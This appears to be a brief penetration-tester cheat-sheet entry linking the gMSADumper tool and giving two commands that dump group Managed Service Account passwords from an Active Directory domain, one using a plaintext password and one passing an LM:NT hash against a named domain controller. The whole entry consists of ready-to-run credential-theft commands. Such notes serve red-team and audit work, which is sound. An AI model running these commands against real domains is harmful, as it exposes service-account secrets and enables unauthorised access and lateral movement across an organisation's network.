### source
https://github.com/micahvandeusen/gMSADumper  

### read all gMSA passwords from any possible computer
```
python3 gMSADumper.py -u <user> -p <password> -d <domain>
```

### read all gMSA password from any possible using NT hash and specific domain controller
```
python3 gMSADumper.py -u <user> -p <lmHash:ntHash> -d <domain> -l <rhost>
```

